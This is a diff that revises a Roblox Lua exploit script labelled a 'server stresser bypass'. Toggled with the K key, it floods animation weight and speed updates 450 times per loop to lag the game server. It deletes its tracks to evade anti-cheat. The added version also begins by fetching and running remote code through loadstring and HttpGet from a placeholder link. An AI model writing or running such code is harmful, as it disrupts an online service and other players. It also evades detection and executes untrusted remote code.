@@ -1,53 +1,57 @@
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
+-- 1. EXECUTE YOUR HUB
+-- Replace the URL below with your new GitHub link
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("YOUR_NEW_LINK_HERE"))()
+    end)
+    if not success then warn("Hub failed to load: " .. err) end
+end)
 
+-- 2. SERVER STRESSER BYPASS (JAN 2026)
+local player = game.Players.LocalPlayer
 local active = false
-local player = Players.LocalPlayer
+local ugcId = "rbxassetid://132120738166011" -- Heavy UGC ID
 
-
-local ugcId = "rbxassetid://132120738166011" 
-
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if not gpe and input.KeyCode == Enum.KeyCode.K then
-        active = not active
-        warn("UGC OVERDRIVE:", active)
+-- Toggle with 'K'
+game:GetService("UserInputService").InputBegan:Connect(function(i, g)
+    if not g and i.KeyCode == Enum.KeyCode.K then 
+        active = not active 
+        print("LAG STATUS:", active)
     end
 end)
 
+-- The Bypass Loop
 task.spawn(function()
     while true do
         if active then
             local char = player.Character
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
-            local animator = hum and hum:FindFirstChildOfClass("Animator")
+            local animator = char and char:FindFirstChildOfClass("Humanoid") and char.Humanoid:FindFirstChildOfClass("Animator")
             
             if animator then
-                
-                for _, t in pairs(animator:GetPlayingAnimationTracks()) do
-                    t:Stop(0)
-                    t:Destroy()
-                end
-
-                
-                local anim = Instance.new("Animation")
-                anim.AnimationId = ugcId
-                local track = animator:LoadAnimation(anim)
-                track:Play()
-
-                
-                for i = 1, 350 do
-                    track:AdjustWeight(math.random(1, 100))
-                    track:AdjustSpeed(math.random(1, 100))
-                end
-                
-                task.spawn(function()
-                    task.wait() 
+                -- NEW LIMIT BYPASS: Force clear the 32 slots
+                for _, track in pairs(animator:GetPlayingAnimationTracks()) do
+                    track:Stop(0)
                     track:Destroy()
-                    anim:Destroy()
-                end)
+                end
+
+                -- LOAD AND WEIGHT-FLOOD
+                local a = Instance.new("Animation")
+                a.AnimationId = ugcId
+                local t = animator:LoadAnimation(a)
+                t:Play()
+
+                -- High-speed data spam (Sends 450 packets per cycle)
+                for i = 1, 450 do
+                    t:AdjustWeight(math.random(1, 100))
+                    t:AdjustSpeed(math.random(1, 100))
+                end
+                
+                -- Cleanup to stay invisible to anti-cheat
+                task.wait()
+                t:Destroy()
+                a:Destroy()
             end
         end
-        task.wait(0.02) 
+        task.wait(0.01) -- Run as fast as possible
     end
 end)
